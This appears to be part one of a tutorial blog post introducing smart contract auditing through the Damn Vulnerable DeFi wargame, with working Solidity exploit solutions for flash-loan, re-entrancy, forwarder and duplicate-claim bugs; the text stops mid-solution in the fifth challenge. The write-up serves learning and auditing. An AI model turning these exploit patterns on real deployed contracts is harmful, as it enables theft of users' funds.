---
title: "[Research] smart contracts auditing 101 for pwners - PART 1 (EN)"
author: d4tura
tags: [d4tura, SmartContract, DeFi, Blockchain, Solidity]
categories: [Research]
date: 2025-09-07 17:00:00
cc: true
index_img: /2025/09/07/d4tura/smartcontracts/en/smartcontracts.jpg
---

## Introduction
Hello, I’m d4tura, newly joining hackyboiz!

I started writing this research post while solving the [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/) smart contracts wargame, with the goal of breaking down and understanding the concepts required to solve each challenge.  

Originally, I have been doing zero-day research and exploit development for more “traditional” targets such as kernels, hypervisors, client-server protocols, and mobile platforms—both professionally and personally—for several years, and that’s still my main work today, haha.  

However, I believe that by exploring new fields I haven’t touched before and exchanging ideas with others, there is always much to learn from one another. With that mindset, I decided to join the **hackyboiz** team, and chose smart contracts auditing—something I had no prior experience with—as the subject of my writing.  

This post is written so that people like me, who mainly deal with system hacking, can start smart contracts auditing with just basic blockchain knowledge. Therefore, instead of focusing on the exact solutions for specific challenges, I tried to explain the **core concepts needed to solve them, in the simplest possible way, from a pwner’s perspective.**  

Also, while most of the challenges are written in Solidity, I intentionally skipped deep dives into the language itself. The focus here is not on specific bug patterns, but rather on the underlying concepts embedded in each challenge.  

Lastly, for terms that are secondary or might disrupt the flow of the writing, I didn’t provide long explanations in the text itself. Instead, I’ve added **hyperlinks** to other well-written documents or code references for further reading.  


![](/2025/09/07/d4tura/smartcontracts/en/image1.png)

## Introduction to Damn Vulnerable DeFi  

The **Damn Vulnerable DeFi** wargame was originally maintained by the [OpenZeppelin](https://github.com/OpenZeppelin/damn-vulnerable-defi) group and later taken over by The Red Guild, which currently maintains it up to [v4.1.0](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0).  

All challenge environments are defined in the path `damn-vulnerable-defi/test/[challenge name]/[challenge name].t.sol`. For example, the `Unstoppable` challenge environment can be found in the file [test/unstoppable/Unstoppable.t.sol](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/unstoppable/Unstoppable.t.sol).  


![](/2025/09/07/d4tura/smartcontracts/en/image2.png)

Each challenge environment is structured within a single contract and consists of the following functions and parameters:

- `deployer`  
  - The entity responsible for deploying each smart contract, essentially acting as the vendor.  

- `player`  
  - The participant solving the challenge.  

- `setUp()`  
  - The function that sets up the challenge environment. Analysis should begin by checking how the environment is initialized here.  

- `test_assertInitialState()`  
  - A function that verifies whether the initial setup in `setUp()` was correctly applied.  

- `test_challengeName()`  
  - The function where the solution must be implemented after analyzing the challenge. The **`player` is only allowed to modify this function.**  

- `_isSolved()`  
  - A function that determines whether the challenge has been solved. If this function runs and completes without issues, the challenge is considered solved.  

Most of the smart contract code targeted by each challenge can be found in the path `damn-vulnerable-defi/src/[challenge name]/`. In the `setUp()` function, an instance of the contract is created, and the initial environment is configured. The objective of the wargame is to analyze the vulnerabilities in this contract code and modify the `test_challengeName()` function so that the `_isSolved()` function passes.  

Although the concept of a **contract** may feel unfamiliar at first, I personally find it very similar to a **class** in C++ or other object-oriented languages.  

![](/2025/09/07/d4tura/smartcontracts/en/image3.png)

As an example, let’s look at the `UnstoppableVault` contract from the first challenge we’ll cover, **Unstoppable**. Using functionalities from already implemented contracts such as `IERC3156FlashLender`, `ReentrancyGuard`, `Owned`, `ERC4626`, and `Pausable` is essentially the same as inheriting from parent classes. In addition, the fact that member variables and functions must be marked with the `public` keyword to be accessible externally, and that the `this` keyword is used to reference the current instance, is practically identical to the concept of classes.  

```solidity
/**
 * An ERC4626-compliant tokenized vault offering flashloans for a fee.
 * An owner can pause the contract and execute arbitrary changes.
 */
contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626, Pausable {

		// == member variable
    uint256 public constant FEE_FACTOR = 0.05 ether;
    uint64 public constant GRACE_PERIOD = 30 days;

    uint64 public immutable end = uint64(block.timestamp) + GRACE_PERIOD;

    address public feeRecipient;

		// == member function
    constructor(ERC20 _token, address _owner, address _feeRecipient)
        ERC4626(_token, "Too Damn Valuable Token", "tDVT")
        Owned(_owner)
    {
        feeRecipient = _feeRecipient;
        emit FeeRecipientUpdated(_feeRecipient);
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function maxFlashLoan(address _token) public view nonReadReentrant returns (uint256) {
        if (address(asset) != _token) {
            return 0;
        }

        return totalAssets();
    }

```

Lastly, most challenges involve a token called [DamnValuableToken](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/DamnValuableToken.sol), which is based on [ERC20](https://eips.ethereum.org/EIPS/eip-20). It’s useful to be familiar with the following commonly used ERC20 functions:

- [totalSupply()](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC20-totalSupply--)  
  - Returns the total amount of assets created in the given token instance.  

- [balanceOf(address account)](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-balanceOf-address-)  
  - Returns the total amount of tokens held by the given `account`.  

- [transfer(address to, address value)](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-balanceOf-address-)  
  - Withdraws `value` tokens from the caller’s account and sends them to `to`.  

- [transferFrom(address from, address to, uint256 value)](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-transferFrom-address-address-uint256-)  
  - Withdraws `value` tokens from the `from` account and sends them to `to`.  

- [approve(address spender, uint256 value)](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-approve-address-uint256-)  
  - Allows `spender` to withdraw up to `value` tokens from the caller’s account.  

(Just FYI, [ERC](https://eips.ethereum.org/erc) stands for **Ethereum Request for Comment**, essentially the smart contract version of [RFC](https://en.wikipedia.org/wiki/Request_for_Comments) documents used in traditional programming to define technical specifications.)  

---

## 1. Unstoppable: total balance != total supply  

### Challenge Explanation  

In the case of the `Unstoppable` challenge, the goal is to trigger a `revert` statement inside the [UnstoppableVault.flashLoan()](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/unstoppable/UnstoppableVault.sol#L78) function. There are a total of four `revert` statements present.  


```solidity
    function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
~~~~        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256("IERC3156FlashBorrower.onFlashLoan")
        ) {
            revert CallbackFailed();
        }
        // ....
```

The `revert InvalidAmount(0)`, `revert UnsupportedCurrency()`, and `revert CallbackFailed()` statements are not parts of the challenge that the player can deliberately manipulate. Instead, they serve more as basic integrity checks (sanity checks) to ensure the function behaves correctly under normal conditions. Therefore, our real objective is to trigger the `revert InvalidBalance()` statement.  


```solidity
// UnstoppableVault.totalAssets
function totalAssets() public view override nonReadReentrant returns (uint256) {
    return asset.balanceOf(address(this));
}

// ERC4626.convertToShares
function convertToShares(uint256 assets) public view virtual returns (uint256) {
    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.
    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
}
```

The `totalAssets()` function returns the total amount of assets (balance) currently held by the `UnstoppableVault` contract. The `convertToShares()` function may look a bit more complex since it involves arithmetic operations, but in practice, it can be interpreted as follows.  

```solidity
convertToShares(totalSupply) 
= (totalSupply * totalSupply) / totalAssets()
```

Here, `totalSupply` refers to the total assets issued by the ERC20 token. It increases when tokens are minted ([mint](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC4626-mint-uint256-address-)) and decreases when they are burned ([burn](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC20-_burn-address-uint256-)).  


```solidity
	  // ERC20._mint
    function _mint(address to, uint256 amount) internal virtual {
        totalSupply += amount;
        
.....
		// ERC20._burn
    function _burn(address from, uint256 amount) internal virtual {
        // ....
        unchecked {
            totalSupply -= amount;
        }
```

Looking at the initial setup (`setUp()` function) of the challenge, an amount equal to `TOKEN_IN_VAULT` is deposited into the `vault`. During this process, the amount deposited in the `vault` (`totalAssets`) and the total supply of tokens issued (`totalSupply`) both become equal to the value of `TOKEN_IN_VAULT`.  


```solidity
    // UnstoppableChallenge.setUp
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));
        
// ....

    // ERC4626._deposit
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal virtual {
        // If _asset is ERC-777, `transferFrom` can trigger a reentrancy BEFORE the transfer happens through the
        // `tokensToSend` hook. On the other hand, the `tokenReceived` hook, that is triggered after the transfer,
        // calls the vault, which is assumed not malicious.
        //
        // Conclusion: we need to do the transfer before we mint so that any reentrancy would happen before the
        // assets are transferred and before the shares are minted, which is a valid state.
        // slither-disable-next-line reentrancy-no-eth
        SafeERC20.safeTransferFrom(_asset, caller, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(caller, receiver, assets, shares);
    }
```

### Challenge Solving

At the start, both `totalSupply` (the amount of tokens minted by the `token`) and `totalAssets()` (the amount deposited in the `vault`) are equal to `TOKEN_IN_VAULT`. Because of this, `convertToShares(totalSupply)` returns `TOKEN_IN_VAULT`, and `totalAssets()` also returns `TOKEN_IN_VAULT`, making them identical.  

However, this condition is not guaranteed to always hold true. What happens if someone transfers tokens directly to the `vault` address? In that case, the actual assets held by the `vault` (`totalAssets`) increase, but the total supply of tokens (`totalSupply`) remains unchanged. This discrepancy causes the condition `convertToShares(totalSupply) != balanceBefore` to become true.  

Therefore, simply sending even a very small amount of tokens directly to the `vault` contract address is enough to solve the challenge.  


```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}
```

## 2. Naive Receiver: flash loan with fixed fee  

### Challenge Explanation  

The objective of this challenge is to drain all the assets from both the `receiver` and the `pool`, and then transfer them to the `recovery`, using no more than two transaction calls.  

(**Just FYI, in this context, the term **transaction** refers to invoking functions that are defined in other contracts.)  


```solidity
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
```

The [pool.flashLoan()](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/NaiveReceiverPool.sol#L43) function, as its name suggests, provides an unsecured loan (flash loan) service to the `receiver`, and charges a fixed fee of `FIXED_FEE` (`1 ether`) as compensation.  

(Just FYI, `1e18` = `1 ether`)  

```solidity
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    if (token != address(weth)) revert UnsupportedCurrency();

    // Transfer WETH and handle control to receiver
    weth.transfer(address(receiver), amount);
    totalDeposits -= amount;

    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    uint256 amountWithFee = amount + FIXED_FEE;
    weth.transferFrom(address(receiver), address(this), amountWithFee);
    totalDeposits += amountWithFee;

    deposits[feeReceiver] += FIXED_FEE;

    return true;
}
```

### Challenge Solving  

The key is that by repeatedly calling the `flashLoan` function, the fixed fee `FIXED_FEE` can be exploited to gradually transfer all of the `receiver`’s assets into the `pool`. This process is repeated until the `receiver`’s balance is completely drained.  

After that, looking at the [pool.withdraw()](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/NaiveReceiverPool.sol#L66) function, you’ll notice that **there are no authorization checks when withdrawing assets.** This allows us to easily withdraw all the assets accumulated in the `pool` and send them to any address we want.  


```solidity
function withdraw(uint256 amount, address payable receiver) external {
    // Reduce deposits
    deposits[_msgSender()] -= amount;
    totalDeposits -= amount;

    // Transfer ETH to designated receiver
    weth.transfer(receiver, amount);
}
```

This challenge must be solved with no more than two transactions. To achieve this, you can use the [MultiCall.multicall()](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/Multicall.sol#L9) function, which allows multiple function calls to be bundled together and executed within a single transaction.  

```solidity
function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
    return results;
}
```

In the final step of the solution, we use the [BasicForwarder.execute()](https://github.com/theredguild/damn-vulnerable-defi/blob/98028bbbc32c189b99241ba993d69d3517837e29/src/naive-receiver/BasicForwarder.sol#L55) function. The `BasicForwarder` contract supports [meta transactions](https://www.alchemy.com/overviews/meta-transactions), which allow gas fees to be paid on behalf of the user.  

![](/2025/09/07/d4tura/smartcontracts/en/image4.png)  

In this challenge, to successfully withdraw all the assets from the `pool`, the `_msgSender()` must return the `deployer`’s address when the `withdraw` function is called. By using `BasicForwarder`, we can satisfy this condition.  

(Just FYI, a **gas fee** refers to the fee paid whenever a transaction is recorded on the blockchain—such as when calling a smart contract function—on the actual mainnet.)  

```solidity
// NaiveReceiverPool.sol
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}

// BasicForwarder.sol
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    _checkRequest(request, signature);

    nonces[request.from]++;

    uint256 gasLeft;
    uint256 value = request.value; // in wei
    address target = request.target;
    bytes memory payload = abi.encodePacked(request.data, request.from);
    uint256 forwardGas = request.gas;
    assembly {
        success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
        gasLeft := gas()
    }

    if (gasLeft < request.gas / 63) {
        assembly {
            invalid()
        }
    }
}
```

The final attack flow can be summarized as follows:

1. Use the `multicall` function to call the `flashLoan` function 10 times, draining all of the `receiver`’s assets into the `pool`. Then, immediately call the `withdraw` function to transfer all the funds from the `pool` into the `recovery` account.  

2. Execute the entire process through `BasicForwarder`, ensuring that everything is handled within a single transaction.  

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory call_datas = new bytes[](11);
    // WETH_IN_RECEIVER = 10e18
    // FIXED_FEE = 1e8
    // calling flashLoan 10 times
    for(uint i = 0; i < 10; i++) {
        call_datas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 9e18, ""));
    }

		// deposits[deployer] -= WETH_IN_POOL + WETH_IN_RECEIVER;
		// weth.transfer(recovery, WETH_IN_POOL + WETH_IN_RECEIVER);
    call_datas[10] = abi.encodePacked(
        abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        bytes20(uint160(deployer))
    );

    bytes memory call_data = abi.encodeCall(Multicall.multicall, call_datas);

    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: gasleft(),
        nonce: forwarder.nonces(player),
        data: call_data,
        deadline: block.timestamp + 1 days
    });

    // creating hash for request
    bytes32 request_hash = keccak256(
        abi.encodePacked(
            "\x19\x01", // == EIP-712 signature, because BasicForwarder is EIP712
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );

    // r = 1st part of signature
    // s = 2nd part of signature
    // v = recovery ID
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, request_hash);
    bytes memory signature = abi.encodePacked(r,s,v);

    forwarder.execute(request, signature);
}
```

## 3. Truster: don’t trust borrower too much  

### Challenge Explanation  

The [TrusterLenderPool.sol](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/truster/TrusterLenderPool.sol) contract’s `flashLoan` function provides an unsecured loan to the `borrower`. What’s unusual here is that the logic for how the borrowed funds are used is passed in as the `data` argument, which is then executed directly through a [call](https://rareskills.io/post/low-level-call-solidity).  

After the function call finishes, the pool checks whether its balance (`token.balanceOf(address(this))`) is less than it was before the loan (`balanceBefore`). If it is, a `revert` occurs. In other words, either the loan amount must be `0`, or the borrowed funds must be repaid within the function passed through the `data` argument.  

```solidity
// TrusterLenderPool.flashLoan
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

### Challenge Solving  

The key issue here is that the `data` argument allows us to call **any function**. What happens if we call the [ERC20.approve()](https://github.com/transmissions11/solmate/blob/34d20fc027fe8d50da71428687024a29dc01748b/src/tokens/ERC20.sol#L68) function?  

The `approve` function sets an [allowance](https://metaschool.so/articles/what-are-erc20-approve-erc20-allowance-methods), which defines how many tokens a specific account (`spender`) is allowed to withdraw from the caller’s (`msg.sender`) account. Importantly, this operation **does not affect the actual balance of the pool**.  

```solidity
// ERC20.approve
function approve(address spender, uint256 amount) public virtual returns (bool) {
    allowance[msg.sender][spender] = amount;

    emit Approval(msg.sender, spender, amount);

    return true;
}
```

Since increasing the `allowance` value only expands the withdrawal limit without affecting the actual balance of the `pool`, the following approach can be taken:

- Call the `flashLoan()` function with the loan amount (`amount`) set to 0.  
- Use the `data` argument to invoke the `ERC20.approve()` function.  
- Pass the `if (token.balanceOf(address(this)) < balanceBefore)` check, allowing the `flashLoan()` function to complete successfully.  

As a result, the `allowance` value will be set high enough for the attacker to drain all of the `pool`’s assets.  

The full execution flow looks like this:

1. Call the `flashLoan()` function, setting the loan amount (`amount`) to 0.  
2. Pass the `ERC20.approve()` call through the `data` argument, granting the attacker contract permission to withdraw all the `pool`’s assets by adjusting the `allowance`.  
3. Since the pool’s balance does not change, the `flashLoan()` function finishes without any issues.  
4. Using the permission obtained via `approve`, the attacker then calls `transferFrom` to drain all the funds from the `pool`.  

```solidity
function test_truster() public checkSolvedByPlayer {
    new TrusterSolver(pool, recovery, token);
}

// ....

contract TrusterSolver {
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;
    constructor(TrusterLenderPool pool, address recovery, DamnValuableToken token) {
        // ERC20.approve(address(this), TOKENS_IN_POOL);
        // address(this) <- TrusterSolver contract
        bytes memory approve_call = abi.encodeCall(ERC20.approve, (address(this), TOKENS_IN_POOL));

        // amount = 0
        // borrower = address(this) = TrusterSolver contract
        // target = token
        // target.functionCall = token.functionCall(approve_call);
        pool.flashLoan(0, address(this), address(token), approve_call);

        // pool -> recovery to TOKENS_IN_POOL DVT
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}

```

## 4. Side Entrance: re-enter the contract  

### Challenge Explanation  

The [SideEntranceLenderPool.flashLoan()](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/side-entrance/SideEntranceLenderPool.sol#L35) function allows the caller (`msg.sender`) to borrow any amount of ETH without collateral. After granting the loan, it calls the `execute` function defined in the `msg.sender` contract, passing the borrowed amount (`amount`) as `msg.value`.  

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

The `execute` function is marked as [payable](https://docs.soliditylang.org/en/latest/contracts.html#receive-ether-function), which means it can receive ETH when invoked. Through the `{value: amount}` syntax, the caller sends exactly `amount` of ETH to the callee when the function is executed.  

```solidity
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}
```

The `SideEntranceLenderPool` contract also provides deposit (`deposit`) and withdrawal (`withdraw`) functions, recording each user’s deposits in the `balances` mapping.  

For example, when the `withdraw()` function is called, it sends the caller (`msg.sender`) the amount stored in `balances` using the [SafeTransferLib.safeTransferETH()](https://github.com/transmissions11/solmate/blob/50e15bb566f98b7174da9b0066126a4c3e75e0fd/src/utils/SafeTransferLib.sol#L15) function.  

```solidity
contract SideEntranceLenderPool {
    mapping(address => uint256) public balances;
    // ....
    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }
```

### Challenge Solving  

The biggest issue with this contract is that it is vulnerable to a [**Re-entrancy**](https://github.com/kadenzipfel/smart-contract-vulnerabilities/blob/master/vulnerabilities/reentrancy.md) attack. Unlike contracts protected with mechanisms such as [ReentrancyGuard](https://medium.com/@mayankchhipa007/openzeppelin-reentrancy-guard-a-quickstart-guide-7f5e41ee388f), this one has no such safeguards.  

As shown in the diagram, when contract A calls a function (`flashLoan`) of contract B, before the function completes, contract B can call back into contract A’s function (`execute`), and within that function, A can once again call other functions or access objects in contract B to manipulate its state.  

![](/2025/09/07/d4tura/smartcontracts/en/image5.png)  

Personally, I found this type of re-entrancy vulnerability to be very similar to side-effect vulnerabilities in browser JS engines.  

- Examples of JS engine side-effect vulnerabilities:  
  - https://github.com/saelo/cve-2018-4233/blob/master/pwn.js#L27-L32  
  - https://www.enki.co.kr/en/media-center/tech-blog/clobber-the-world-endless-side-effect-issue-in-safari  
  - https://github.blog/security/vulnerability-research/getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/#exploiting-the-bug  

Just as side-effect bugs are a classic category of browser JS engine vulnerabilities, re-entrancy is one of the most representative vulnerability classes in smart contracts. It’s critical to fully understand it.  

![](/2025/09/07/d4tura/smartcontracts/en/image6.png)  

The attack scenario is as follows:  

1. From the attacker contract, call the pool’s `flashLoan()` function to borrow all ETH (`ETHER_IN_POOL`).  
2. The pool transfers the loan and invokes the attacker contract’s `execute()` function.  
3. Inside `execute()`, deposit all borrowed ETH back into the pool using its `deposit()` function. This results in the borrowed amount being recorded under `balances[attacker contract address]`.  
4. Once `execute()` finishes, control returns to the `flashLoan()` function. Since the pool’s balance is unchanged from before the loan, the `RepayFailed()` check is not triggered, and the function completes successfully.  
5. Finally, from the attacker contract, call the pool’s `withdraw()` function to withdraw the amount recorded in `balances`. This allows the attacker to legally drain the funds and transfer them to `recovery`.  

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceSolver solver = new SideEntranceSolver(pool, recovery);
    solver.solve();
}

// ....

contract SideEntranceSolver is IFlashLoanEtherReceiver {
    uint256 constant ETHER_IN_POOL = 1000e18;

    SideEntranceLenderPool _pool;
    address _recovery;

    constructor(SideEntranceLenderPool pool, address recovery) {
        _pool = pool;
        _recovery = recovery;
    }

    function solve() public {
        _pool.flashLoan(ETHER_IN_POOL);
        _pool.withdraw();
        payable(_recovery).transfer(ETHER_IN_POOL);
    }

    function execute() external payable override {
		    // send ETHER_IN_POOL to _pool
        _pool.deposit{value: ETHER_IN_POOL}();
    }
    
    // receive() required if payable function exists on contract
    receive() external payable {}
}
```

## 5. The Rewarder: claim your reward(s)  

### Challenge Explanation  

This time, instead of offering a flash loan service, the contract provides rewards in the form of `DamnValuableToken` and `WETH` to a specific list of addresses.  

The eligible addresses and the corresponding reward amounts are defined as follows:  
- Distribution of `DamnValuableToken` rewards is specified in [dvt-distribution.json](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/the-rewarder/dvt-distribution.json).  
- Distribution of `WETH` rewards is specified in [weth-distribution.json](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/the-rewarder/weth-distribution.json).  


```json
// dvt-distribution.json
[
    {
        "address": "0x230abc2a7763e0169b38fbc7d48a5aa7b6245011",
        "amount": 4665241241345036
    },
    {
        "address": "0x81e46e5cbe296dfc5e9b2df97ec8f24a9a65bec2",
        "amount": 9214418266997362
    },
    {
        "address": "0x328809Bc894f92807417D2dAD6b7C998c1aFdac6",
        "amount": 2502024387994809
    },
    ...

// weth-distribution.json
[
    {
        "address": "0x230abc2a7763e0169b38fbc7d48a5aa7b6245011",
        "amount": 3726409081682308
    },
    {
        "address": "0x81e46e5cbe296dfc5e9b2df97ec8f24a9a65bec2",
        "amount": 870420547863448
    },
    {
        "address": "0x328809Bc894f92807417D2dAD6b7C998c1aFdac6",
        "amount": 228382988128225
    },
    ...
```

Looking at the [TheRewardDistributor.claimRewards()](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/the-rewarder/TheRewarderDistributor.sol#L81) function, you can see that it is implemented to handle multiple reward claims in a single batch. This kind of design—accepting multiple requests and processing them within a single transaction—is widely adopted in many smart contract implementations to **save on gas fees**.  

By the way, there’s a vulnerability hidden in this function. Can you spot it? 😊  


```solidity
struct Distribution {
    uint256 remaining;
    uint256 nextBatchNumber;
    mapping(uint256 batchNumber => bytes32 root) roots;
    mapping(address claimer => mapping(uint256 word => uint256 bits)) claims;
}

// ....

// Allow claiming rewards of multiple tokens in a single transaction
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    Claim memory inputClaim;
    IERC20 token;
    uint256 bitsSet; // accumulator
    uint256 amount;

    for (uint256 i = 0; i < inputClaims.length; i++) {
        inputClaim = inputClaims[i];

        uint256 wordPosition = inputClaim.batchNumber / 256;
        uint256 bitPosition = inputClaim.batchNumber % 256;

        if (token != inputTokens[inputClaim.tokenIndex]) {
            if (address(token) != address(0)) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }

            token = inputTokens[inputClaim.tokenIndex];
            bitsSet = 1 << bitPosition; // set bit at given position
            amount = inputClaim.amount;
        } else {
            bitsSet = bitsSet | 1 << bitPosition;
            amount += inputClaim.amount;
        }

        // for the last claim
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }

        bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
        bytes32 root = distributions[token].roots[inputClaim.batchNumber];

        if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

        inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
    }
}

function _setClaimed(IERC20 token, uint256 amount, uint256 wordPosition, uint256 newBits) private returns (bool) {
    uint256 currentWord = distributions[token].claims[msg.sender][wordPosition];
    if ((currentWord & newBits) != 0) return false;

    // update state
    distributions[token].claims[msg.sender][wordPosition] = currentWord | newBits;
    distributions[token].remaining -= amount;

    return true;
}
```

### Challenge Solving  

The `_setClaimed()` function records whether a reward has already been claimed using a bitmap. However, if you look closely at the logic inside `claimRewards()`, you’ll see that the values for `bitsSet` (claim record) and `amount` (claim amount) are continuously accumulated.  

The important detail is that `_setClaimed()` is only called **at the end of the loop** or **when the type of token being processed changes**, at which point the accumulated claim record is finally stored.  

```solidity
        bitsSet = bitsSet | 1 << bitPosition;
        amount += inputClaim.amount;

// ....

        // for the last claim
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }

```

The problem is that **even if the same reward claim request is submitted multiple times**, the process of accumulating `bitsSet` (`bitsSet | 1 << bitPosition`) does not properly check for duplicates. For example, if the same request is sent five times, the same bit in `bitsSet` is simply overwritten five times, and no error occurs.  

However, since the `transfer` operation is executed inside the loop on every iteration, the attacker ends up receiving the reward five times.  

Because the `player` address is already registered in the reward list for each token, this flaw can be exploited by repeatedly claiming the reward assigned to them, thereby solving the challenge.  

```solidity
function test_theRewarder() public checkSolvedByPlayer {

    // Step 1: search player's index in DVT list
    Reward[] memory dvtRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/dvt-distribution.json"))), (Reward[]));
    uint256 dvtIndex;
    uint256 dvtAmount;
    for (uint256 i = 0; i < dvtRewards.length; i++) {
        if (dvtRewards[i].beneficiary == player) {
            dvtIndex = i;
            console.log("player = ", dvtRewards[i].beneficiary);
            dvtAmount = dvtRewards[i].amount;
            break;
        }
    }
    require(dvtAmount > 0, "Player not in DVT list");

    // Step 2: search player's index in WETH list
    Reward[] memory wethRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/weth-distribution.json"))), (Reward[]));
    uint256 wethIndex;
    uint256 wethAmount;
    for (uint256 i = 0; i < wethRewards.length; i++) {
        if (wethRewards[i].beneficiary == player) {
            wethIndex = i;
            console.log("player = ", wethRewards[i].beneficiary);
            wethAmount = wethRewards[i].amount;
            break;
        }
    }
    require(wethAmount > 0, "Player not in WETH list");

    // Step 3: create proof for each token
    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, dvtIndex);
    bytes32[] memory wethProof = merkle.getProof(wethLeaves, wethIndex);

    // Step 4: create tokensToClaim
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    // Step 5: calculate how many duplicated claims requires
    uint256 dvtRemaining = distributor.getRemaining(address(dvt));
    uint256 wethRemaining = distributor.getRemaining(address(weth));
    uint256 dvtN = dvtRemaining / dvtAmount; 
